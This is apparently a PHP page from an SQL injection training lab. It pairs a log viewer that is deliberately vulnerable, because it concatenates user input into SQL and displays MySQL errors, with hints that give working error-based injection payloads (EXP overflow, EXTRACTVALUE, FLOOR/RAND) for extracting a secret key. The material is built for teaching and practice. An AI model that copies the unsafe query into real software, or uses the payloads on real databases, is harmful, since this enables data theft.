<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT setting_value FROM config WHERE setting_name='master_key' LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['setting_value']) {
        $_SESSION['mysql_lab7_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab7", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 7. Error-Based: Advanced Error Techniques (EXP / BIGINT Overflow)</h3>

    <h4>Scenario</h4>
    <p>
        A log viewer application shows how many entries exist for a given IP address.
        The page displays <strong>&ldquo;Found N entries for IP: x.x.x.x&rdquo;</strong>
        but never shows actual log data. A <code>config</code> table holds a secret
        <code>master_key</code>. MySQL errors are shown on the page.
    </p>

    <h4>Objective</h4>
    <p>
        Use advanced error-based techniques to extract the <strong>master_key</strong>
        from the <code>config</code> table. On older MySQL 5.x, you could use
        <code>EXP(~(SELECT ...))</code> for BIGINT overflow. On modern MariaDB/MySQL 8+,
        use <strong>EXTRACTVALUE()</strong> or the <strong>FLOOR/RAND/GROUP BY</strong>
        double-query technique instead. Submit the master key below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try a single quote <code>'</code>: does it trigger an error?<br>
        2. The <code>EXP()</code> function overflows on large values: <code>EXP(~(SELECT 0))</code> = <code>EXP(~0)</code> = overflow.<br>
        3. On MySQL 5.5.x: <code>' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e, setting_value) FROM config WHERE setting_name='master_key') x)) -- -</code><br>
        4. On modern MySQL/MariaDB, EXP overflow is patched. Use EXTRACTVALUE instead:<br>
           <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT setting_value FROM config WHERE setting_name='master_key'))) -- -</code><br>
        5. Or use the FLOOR/RAND double-query: <code>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT setting_value FROM config WHERE setting_name='master_key'), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.columns GROUP BY x) a) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab7_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the master key using advanced error-based SQL injection techniques.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Log Viewer</h4>
    <form method="POST" class="form-row">
<input type="text" name="ip" class="input" placeholder="Enter IP address (try: 192.168.1.10)" value="<?= htmlspecialchars($_POST['ip'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search Logs</button>
    </form>
</div>

<?php
if (isset($_POST['ip'])) {
    $ip = $_POST['ip'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT * FROM logs WHERE ip_address = '$ip'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MySQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mysql&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute: error-based: only show count, NOT actual log data
    try {
        $result = mysqli_query($conn, $query);

        if ($result) {
            $count = mysqli_num_rows($result);
            if ($count > 0) {
                echo '<div class="result-success result-box"><strong>Found ' . htmlspecialchars($count) . ' entries</strong> for IP: ' . htmlspecialchars($ip) . '</div>';
            } else {
                echo '<div class="result-warning result-box">No log entries found for IP: ' . htmlspecialchars($ip) . '</div>';
            }
        }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MySQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
